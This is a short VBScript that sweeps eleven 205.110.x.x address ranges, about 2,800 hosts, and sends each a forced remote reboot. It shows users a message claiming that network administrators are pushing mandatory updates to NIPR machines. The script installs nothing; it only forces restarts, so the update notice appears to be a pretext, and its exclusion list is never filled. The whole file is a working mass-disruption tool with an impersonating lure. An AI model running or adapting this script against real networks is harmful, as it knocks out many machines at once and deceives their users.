dim objWSH, x, i
dim arrIP(10), strIP, strCMD, strNote

set objWSH  = createobject("wscript.shell")

arrIP(0) = "98"
arrIP(1) = "76"
arrIP(2) = "88"
arrIP(3) = "89"
arrIP(4) = "96"
arrIP(5) = "97"
arrIP(6) = "74"
arrIP(7) = "99"
arrIP(8) = "100"
arrIP(9) = "132"
arrIP(10) = "143"
strKey = vbnullstring
strIP = "205.110."
strCMD = "shutdown -r -m \\"
strNote = "TQ TCF Network Administrators are pushing MANDATORY updates to ALL NIPR machines. Please save your work in the time alloted (5 minutes) and allow you machine to reboot normally."

for x = 0 to 10
for i = 1 to 255
call chkIP(strIP & arrIP(x) & "." & i)
wscript.sleep 250
next
next
call scrClean

sub chkIP(IP)
dim arrIPex(43),blnIP, n
blnIP = "FALSE"
for n = 0 to 43
if arrIPex(n) = IP then
blnIP = "TRUE"
end if
next
if blnIP = "FALSE" then
objWSH.run strCMD & IP & " -t 300 -c " & chr(34) & strNote & chr(34) & " -f"
wscript.echo strCMD & IP & " -t 300 -c " & chr(34) & strNote & chr(34) & " -f"
end if
end sub

sub keyLoop()
wscript.echo "Press Any Key to Continue..."
strKey = wscript.stdin.readline
if strKey = vbnullstring then
call keyLoop
end if
end sub

sub scrClean()
set objWSH = nothing
wscript.quit
end sub

''V--V Script Written By Khristos V--V''
''V--V VampyreMan Studios Inc. V--V''
''V--V www.vampyremanstudios.com V--V''